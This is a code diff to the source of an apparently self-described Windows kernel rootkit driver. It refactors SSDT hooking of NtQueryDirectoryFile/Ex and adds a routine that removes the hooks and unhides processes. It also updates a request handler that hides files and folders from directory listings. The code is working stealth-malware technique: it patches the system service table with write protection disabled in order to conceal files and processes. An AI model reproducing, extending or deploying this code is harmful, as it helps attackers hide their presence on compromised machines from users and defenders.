@@ -100,6 +100,25 @@ NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleN
 }
 
 
+BOOL roothook::CleanAllHooks() {
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+	if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERY_TAG))) {
+		return FALSE;
+	}
+	if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERYEX_TAG))) {
+		return FALSE;
+	}
+	Status = process::UnhideProcess(0, 0);
+	while (NT_SUCCESS(Status)) {
+		Status = process::UnhideProcess(0, 0);
+	}
+	if (Status == STATUS_INVALID_PARAMETER) {
+		return TRUE;
+	}
+	return FALSE;
+}
+
+
 ULONG roothook::SSDT::GetSystemCallIndex(PUNICODE_STRING SystemServiceName) {
 	PVOID SystemServiceAddress = MmGetSystemRoutineAddress(SystemServiceName);
 	if (SystemServiceAddress == NULL) {
@@ -197,11 +216,11 @@ NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag){
 
 	// Get the original function matching buffer and find the syscall number:
 	switch (Tag) {
-	case 'HkQr': OriginalFunction = &ActualNtQueryDirFile; SyscallNumber = NTQUERY_SYSCALL1809; break;
-	case 'HkQx': OriginalFunction = &ActualNtQueryDirFileEx;  SyscallNumber = NTQUERYEX_SYSCALL1809;  break;
+	case NTQUERY_TAG: OriginalFunction = &ActualNtQueryDirFile; SyscallNumber = NTQUERY_SYSCALL1809; break;
+	case NTQUERYEX_TAG: OriginalFunction = &ActualNtQueryDirFileEx;  SyscallNumber = NTQUERYEX_SYSCALL1809;  break;
 	default:
 		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT hook failed (invalid tag)\n");
+		DbgPrintEx(0, 0, "KMDFdriver SSDT hook failed (invalid tag: %lu)\n", Tag);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
 		return STATUS_INVALID_PARAMETER;
 	}
@@ -294,19 +313,31 @@ NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag){
 }
 
 
-NTSTATUS roothook::SSDT::SystemServiceDTUnhook(PVOID HookingFunction, ULONG SyscallNumber) {
+NTSTATUS roothook::SSDT::SystemServiceDTUnhook(ULONG Tag) {
 	PULONG ServiceTableBase = NULL;
 	KIRQL CurrentIRQL = NULL;
 	ULONG SSDTEntryValue = NULL;
-	if (HookingFunction == NULL || SyscallNumber == 0) {
+	PVOID ActualFunction = NULL;
+	ULONG SyscallNumber = 0;
+
+	if (Tag == 0) {
 		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT unhook failed (invalid parameters: %p, %lu)\n", HookingFunction, SyscallNumber);
+		DbgPrintEx(0, 0, "KMDFdriver SSDT unhook failed (invalid parameter: %lu)\n", Tag);
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_INVALID_PARAMETER;
+	}
+	switch (Tag) {
+	case NTQUERY_TAG: ActualFunction = ActualNtQueryDirFile; SyscallNumber = NTQUERY_SYSCALL1809; break;
+	case NTQUERYEX_TAG: ActualFunction = ActualNtQueryDirFileEx;  SyscallNumber = NTQUERYEX_SYSCALL1809;  break;
+	default:
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver SSDT unhook failed (invalid tag: %lu)\n", Tag);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
 		return STATUS_INVALID_PARAMETER;
 	}
 	ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
 	CurrentIRQL = roothook::SSDT::DisableWriteProtection();
-	SSDTEntryValue = roothook::SSDT::GetOffsetFromSSDTBase((ULONG64)HookingFunction);
+	SSDTEntryValue = roothook::SSDT::GetOffsetFromSSDTBase((ULONG64)ActualFunction);
 	SSDTEntryValue &= 0xFFFFFFF0;
 	SSDTEntryValue += ServiceTableBase[SyscallNumber] & 0x0F;
 	ServiceTableBase[SyscallNumber] = SSDTEntryValue;
@@ -382,7 +413,7 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 		if ((ULONG64)RootkInstructions->Reserved == HIDE_FILE) {
 			FileNameBuffer = ExAllocatePoolWithTag(NonPagedPool, RootkInstructions->Size, 'HfNb');
 			if (FileNameBuffer == NULL) {
-				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_MEMORY_NOT_ALLOCATED, RootkInstructions);
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_MEMORY_NOT_ALLOCATED, RootkInstructions);
 			}
 			RootkInstructions->Out = FileNameBuffer;
 		}
@@ -396,7 +427,7 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 			if (FileNameBuffer == NULL) {
 				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (impossible name buffer = NULL)\n");
 				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
-				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_MEMORY_NOT_ALLOCATED, RootkInstructions);
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_MEMORY_NOT_ALLOCATED, RootkInstructions);
 			}
 			FileName.Buffer = (WCHAR*)FileNameBuffer;
 			FileName.Length = (USHORT)(wcslen((WCHAR*)FileNameBuffer) * sizeof(WCHAR));
@@ -407,7 +438,7 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 				if (FileNameBuffer != NULL) {
 					ExFreePool(FileNameBuffer);
 				}
-				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInstructions);
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInstructions);
 			}
 			else {
 				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeded (Succeeded to add file/folder name %wZ to hiding list)\n", FileName);
@@ -415,7 +446,7 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 				if (FileNameBuffer != NULL) {
 					ExFreePool(FileNameBuffer);
 				}
-				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
 			}
 		}
 		else if (Return == UNHIDE_TEMPSUC) {
@@ -428,18 +459,18 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 					DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to remove file/folder at index %llu, name %wZ to hiding list)\n", (ULONG64)RootkInstructions->Reserved, FileName);
 				}
 				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
-				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInstructions);
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInstructions);
 			}
 			else {
 				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeeded (Succeeded to remove file/folder at index %llu, name %wZ to hiding list)\n", (ULONG64)RootkInstructions->Reserved, FileName);
 				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
-				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
 			}
 		}
 		else if (Return == SHOWHIDDEN_TEMPSUC) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeeded (Succeeded to transfer hidden list to medium, Count %lu, Size %lu, Divider %c)\n", HookHide.HideCount, HookHide.BufferSize, HookHide.HideDivider);
 			DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
-			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
+			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
 		}
 
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to make basic operation)\n");
